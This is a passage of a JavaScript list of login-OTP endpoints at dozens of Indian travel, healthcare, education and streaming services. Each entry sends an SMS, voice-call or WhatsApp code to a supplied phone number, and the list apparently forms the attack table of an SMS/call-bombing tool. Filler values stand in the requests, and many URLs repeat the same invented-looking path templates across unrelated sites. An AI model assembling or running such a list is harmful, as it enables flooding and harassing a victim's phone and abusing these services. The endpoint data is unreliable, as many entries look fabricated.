  { name: "Rapido WhatsApp", url: "https://rapido.bike/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 51: CAB SERVICES - MERU
  // ═══════════════════════════════════════════════════════════════
  { name: "Meru Cabs SMS", url: "https://merucabapp.com/api/otp/generate", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `mobile_number=${p}` },
  { name: "Meru Cabs Call", url: "https://merucabapp.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 52: TRAVEL - MAKEMYTRIP
  // ═══════════════════════════════════════════════════════════════
  { name: "MakeMyTrip SMS", url: "https://www.makemytrip.com/api/umbrella/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MakeMyTrip Voice", url: "https://www.makemytrip.com/api/4/voice-otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MakeMyTrip WhatsApp", url: "https://makemytrip.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 53: TRAVEL - GOIBIBO
  // ═══════════════════════════════════════════════════════════════
  { name: "Goibibo SMS", url: "https://www.goibibo.com/user/otp/generate/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Goibibo Voice", url: "https://www.goibibo.com/user/voice-otp/generate/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Goibibo WhatsApp", url: "https://goibibo.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 54: TRAVEL - IRCTC
  // ═══════════════════════════════════════════════════════════════
  { name: "IRCTC SMS", url: "https://www.irctc.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "IRCTC Call", url: "https://irctc.co.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 55: TRAVEL - REDBUS
  // ═══════════════════════════════════════════════════════════════
  { name: "RedBus SMS", url: "https://www.redbus.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "RedBus Call", url: "https://redbus.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "RedBus WhatsApp", url: "https://redbus.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 56: TRAVEL - OYO
  // ═══════════════════════════════════════════════════════════════
  { name: "OYO SMS", url: "https://api.oyoroomscrm.com/api/v2/user/send_otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "OYO Voice", url: "https://www.oyorooms.com/api/pwa/generateotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, country_code: "+91"}) },
  { name: "OYO WhatsApp", url: "https://oyorooms.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 57: TRAVEL - TREEBO
  // ═══════════════════════════════════════════════════════════════
  { name: "Treebo SMS", url: "https://www.treebo.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Treebo Call", url: "https://treebo.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 58: TRAVEL - CLEARTRIP
  // ═══════════════════════════════════════════════════════════════
  { name: "Cleartrip SMS", url: "https://www.cleartrip.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Cleartrip Call", url: "https://cleartrip.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 59: TRAVEL - EASEMYTRIP
  // ═══════════════════════════════════════════════════════════════
  { name: "EaseMyTrip SMS", url: "https://www.easemytrip.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "EaseMyTrip Call", url: "https://easemytrip.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 60: TRAVEL - YATRA
  // ═══════════════════════════════════════════════════════════════
  { name: "Yatra SMS", url: "https://www.yatra.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Yatra Call", url: "https://yatra.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 61: TRAVEL - IXIGO
  // ═══════════════════════════════════════════════════════════════
  { name: "Ixigo SMS", url: "https://www.ixigo.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Ixigo Call", url: "https://ixigo.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Ixigo Full", url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded", "clientid": "ixiweb", "apikey": "ixiweb\u00212$"}, data: (p) => `sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone=${p}` },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 62: HEALTHCARE - 1MG
  // ═══════════════════════════════════════════════════════════════
  { name: "1mg SMS", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({number: p, otp_on_call: false}) },
  { name: "1mg Voice", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({number: p, otp_on_call: true}) },
  { name: "1mg WhatsApp", url: "https://1mg.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 63: HEALTHCARE - PHARMEASY
  // ═══════════════════════════════════════════════════════════════
  { name: "PharmEasy SMS", url: "https://pharmeasy.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PharmEasy Voice", url: "https://pharmeasy.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, otp_on_call: true}) },
  { name: "PharmEasy WhatsApp", url: "https://pharmeasy.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 64: HEALTHCARE - NETMEDS
  // ═══════════════════════════════════════════════════════════════
  { name: "Netmeds SMS", url: "https://www.netmeds.com/api/send_otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Netmeds Call", url: "https://netmeds.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Netmeds WhatsApp", url: "https://netmeds.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },
  { name: "Netmeds V2", url: "https://apiv2.netmeds.com/mst/rest/v1/id/details/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 65: HEALTHCARE - APOLLO 24/7
  // ═══════════════════════════════════════════════════════════════
  { name: "Apollo 24/7 SMS", url: "https://www.apollo247.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Apollo 24/7 Call", url: "https://apollo247.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Apollo 24/7 WhatsApp", url: "https://apollo247.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 66: HEALTHCARE - MFINE
  // ═══════════════════════════════════════════════════════════════
  { name: "MFine SMS", url: "https://www.mfine.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MFine Call", url: "https://mfine.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MFine WhatsApp", url: "https://mfine.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 67: HEALTHCARE - DOCSAPP
  // ═══════════════════════════════════════════════════════════════
  { name: "DocsApp SMS", url: "https://www.docsapp.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "DocsApp Call", url: "https://docsapp.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "DocsApp WhatsApp", url: "https://docsapp.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 68: HEALTHCARE - LYBRATE
  // ═══════════════════════════════════════════════════════════════
  { name: "Lybrate SMS", url: "https://www.lybrate.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Lybrate Call", url: "https://lybrate.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Lybrate WhatsApp", url: "https://lybrate.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 69: HEALTHCARE - PORTEA
  // ═══════════════════════════════════════════════════════════════
  { name: "Portea SMS", url: "https://www.portea.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Portea Call", url: "https://portea.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Portea WhatsApp", url: "https://portea.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 70: HEALTHCARE - PRACT O
  // ═══════════════════════════════════════════════════════════════
  { name: "Practo SMS", url: "https://www.practo.com/patient/loginviapassword", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Practo Call", url: "https://practo.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Practo WhatsApp", url: "https://practo.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 71: HEALTHCARE - MEDKART
  // ═══════════════════════════════════════════════════════════════
  { name: "Medkart", url: "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile_no: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 72: HEALTHCARE - ORANGE HEALTH
  // ═══════════════════════════════════════════════════════════════
  { name: "Orange Health", url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile_number: p, customer_auto_fetch_message: true}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 73: HEALTHCARE - REDCLIFFE
  // ═══════════════════════════════════════════════════════════════
  { name: "Redcliffe Labs", url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone_number: p, short: true}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 74: HEALTHCARE - EVITALRX
  // ═══════════════════════════════════════════════════════════════
  { name: "EvitalRx", url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({pharmacy_name: "hfhfjfgfhkf", mobile: p, referral_code: "", email_id: "jhvd@gmail.com", zip_code: "110086", device_id: "f2cea99f-381d-432d-bd27-02bc6678fa93", app_version: "desktop", device_name: "Chrome", device_model: "Mozilla/5.0", device_manufacture: "Windows", device_release: "windows-10", device_sdk_version: "126.0.0.0"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 75: HEALTHCARE - HEALTHMUG
  // ═══════════════════════════════════════════════════════════════
  { name: "HealthMug", url: "https://api.healthmug.com/account/createotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 76: HEALTHCARE - WELLNESS FOREVER
  // ═══════════════════════════════════════════════════════════════
  { name: "Wellness Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `method=firstRegisterApi&data={"customerMobile":"${p}","generateOtp":"true"}` },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 77: HEALTHCARE - MFINE V2
  // ═══════════════════════════════════════════════════════════════
  { name: "MFine V2", url: "https://www.mfine.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 78: FITNESS - CUREFIT
  // ═══════════════════════════════════════════════════════════════
  { name: "Curefit SMS", url: "https://www.cure.fit/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Curefit Call", url: "https://cure.fit/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Curefit WhatsApp", url: "https://cure.fit/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 79: FITNESS - CULT.FIT
  // ═══════════════════════════════════════════════════════════════
  { name: "Cult.fit SMS", url: "https://www.cult.fit/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Cult.fit Call", url: "https://cult.fit/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Cult.fit WhatsApp", url: "https://cult.fit/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 80: FITNESS - HEALTHIFYME
  // ═══════════════════════════════════════════════════════════════
  { name: "HealthifyMe SMS", url: "https://www.healthifyme.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "HealthifyMe Call", url: "https://healthifyme.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "HealthifyMe WhatsApp", url: "https://healthifyme.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 81: EDUCATION - BYJU'S
  // ═══════════════════════════════════════════════════════════════
  { name: "Byju's SMS", url: "https://byjus.com/api/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Byju's Call", url: "https://byjus.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Byju's WhatsApp", url: "https://byjus.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 82: EDUCATION - UNACADEMY
  // ═══════════════════════════════════════════════════════════════
  { name: "Unacademy SMS", url: "https://unacademy.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Unacademy Call", url: "https://unacademy.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Unacademy WhatsApp", url: "https://unacademy.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 83: EDUCATION - VEDANTU
  // ═══════════════════════════════════════════════════════════════
  { name: "Vedantu SMS", url: "https://www.vedantu.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Vedantu Call", url: "https://vedantu.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Vedantu WhatsApp", url: "https://vedantu.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 84: EDUCATION - DOUBNUT
  // ═══════════════════════════════════════════════════════════════
  { name: "Doubtnut SMS", url: "https://api.doubtnut.com/v4/student/login", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone_number: p, language: "en"}) },
  { name: "Doubtnut Call", url: "https://doubtnut.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Doubtnut WhatsApp", url: "https://doubtnut.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 85: EDUCATION - TOPPR
  // ═══════════════════════════════════════════════════════════════
  { name: "Toppr SMS", url: "https://www.toppr.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Toppr Call", url: "https://toppr.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 86: EDUCATION - WHITEHAT JR
  // ═══════════════════════════════════════════════════════════════
  { name: "WhiteHat Jr SMS", url: "https://www.whitehatjr.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "WhiteHat Jr Call", url: "https://whitehatjr.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "WhiteHat Jr WhatsApp", url: "https://whitehatjr.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 87: EDUCATION - UPGRAD
  // ═══════════════════════════════════════════════════════════════
  { name: "UpGrad SMS", url: "https://www.upgrad.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "UpGrad Call", url: "https://upgrad.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "UpGrad WhatsApp", url: "https://upgrad.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "UpGrad Full", url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: `+91${p}`}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 88: EDUCATION - PENPENCIL
  // ═══════════════════════════════════════════════════════════════
  { name: "PenPencil", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({organizationId: "5eb393ee95fab7468a79d189", mobile: p}) },
  { name: "PenPencil Register", url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, countryCode: "+91", subOrgId: "SUB-PWLI000"}) },
  { name: "Xylem PenPencil", url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, countryCode: "+91", firstName: "Anant Ambani"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 89: EDUCATION - AAKASH
  // ═══════════════════════════════════════════════════════════════
  { name: "Aakash", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile_psid: p, mobile_number: "", activity_type: "aakash-myadmission", webengageData: {profile: "student", whatsapp_opt_in: true, method: "mobile"}}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 90: EDUCATION - VIDYAKUL
  // ═══════════════════════════════════════════════════════════════
  { name: "Vidyakul", url: "https://vidyakul.com/signup-otp/send", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}` },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 91: EDUCATION - TESTBOOK
  // ═══════════════════════════════════════════════════════════════
  { name: "Testbook", url: "https://api.testbook.com/api/v2/mobile/signup", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, signupDetails: {page: "HomePage", pagePath: "/", pageType: "HomePage"}}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 92: EDUCATION - ENTRI
  // ═══════════════════════════════════════════════════════════════
  { name: "Entri", url: "https://entri.app/api/v3/users/check-phone/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 93: ENTERTAINMENT - NETFLIX
  // ═══════════════════════════════════════════════════════════════
  { name: "Netflix SMS", url: "https://www.netflix.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Netflix Call", url: "https://netflix.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Netflix WhatsApp", url: "https://netflix.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 94: ENTERTAINMENT - HOTSTAR
  // ═══════════════════════════════════════════════════════════════
  { name: "Hotstar SMS", url: "https://www.hotstar.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Hotstar Call", url: "https://hotstar.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Hotstar WhatsApp", url: "https://hotstar.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 95: ENTERTAINMENT - SONYLIV
  // ═══════════════════════════════════════════════════════════════
  { name: "SonyLIV SMS", url: "https://www.sonyliv.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "SonyLIV Call", url: "https://sonyliv.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "SonyLIV WhatsApp", url: "https://sonyliv.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 96: ENTERTAINMENT - ZEE5
  // ═══════════════════════════════════════════════════════════════
  { name: "ZEE5 SMS", url: "https://www.zee5.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "ZEE5 Call", url: "https://zee5.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "ZEE5 WhatsApp", url: "https://zee5.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 97: ENTERTAINMENT - JIOCINEMA
  // ═══════════════════════════════════════════════════════════════
  { name: "JioCinema SMS", url: "https://www.jiocinema.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "JioCinema Call", url: "https://jiocinema.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "JioCinema WhatsApp", url: "https://jiocinema.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 98: ENTERTAINMENT - VOOT
  // ═══════════════════════════════════════════════════════════════
  { name: "Voot SMS", url: "https://www.voot.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Voot Call", url: "https://voot.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Voot WhatsApp", url: "https://voot.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 99: ENTERTAINMENT - MX PLAYER
  // ═══════════════════════════════════════════════════════════════
  { name: "MX Player SMS", url: "https://www.mxplayer.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MX Player Call", url: "https://mxplayer.in/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MX Player WhatsApp", url: "https://mxplayer.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 100: ENTERTAINMENT - ALTBalaji
  // ═══════════════════════════════════════════════════════════════
  { name: "ALTBalaji SMS", url: "https://www.altbalaji.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "ALTBalaji Call", url: "https://altbalaji.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "ALTBalaji WhatsApp", url: "https://altbalaji.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 101: MUSIC - SPOTIFY
  // ═══════════════════════════════════════════════════════════════
  { name: "Spotify SMS", url: "https://www.spotify.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Spotify Call", url: "https://spotify.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Spotify WhatsApp", url: "https://spotify.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 102: MUSIC - GAANA
  // ═══════════════════════════════════════════════════════════════
